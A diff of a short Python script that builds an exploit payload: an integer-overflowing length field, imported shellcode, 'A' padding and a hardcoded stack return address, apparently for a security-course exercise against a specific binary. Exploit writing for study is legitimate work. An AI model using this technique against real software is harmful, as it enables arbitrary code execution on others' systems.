@@ -1,16 +1,13 @@
 import sys
 from shellcode import shellcode
-# sys.stdout.buffer.write(int(1073742024).to_bytes(4,'little'))
-# sys.stdout.buffer.write(shellcode)
-# for num in range (197):
-#     sys.stdout.buffer.write(int(204).to_bytes(4,'little'))
-# sys.stdout.buffer.write(int (204).to_bytes (3,'little'))
-# sys.stdout.buffer.write(0xfff6cc64.to_bytes(4, 'little' ))
-#Start of shellcode = Oxfff6c930
 
-sys.stdout.buffer.write((int)((4294967295+len(shellcode)) / 4).to_bytes(4,'little')
-                        + shellcode + b'A'*(55) + 0xfff6cc00.to_bytes(4, 'little')
-                        )
+shells_addy = 0xfff6cc00
+byty = shells_addy.to_bytes(4, 'little')
+padding = b'AA'*(27)
+overflower = 1073741837 # overflow possible (max of unsigned int + len shellcode) divided by 4
+og = overflower.to_bytes(4,'little')
+
+sys.stdout.buffer.write(og + shellcode + padding + b'A'+ byty)
 
 
 #0x08048ccb
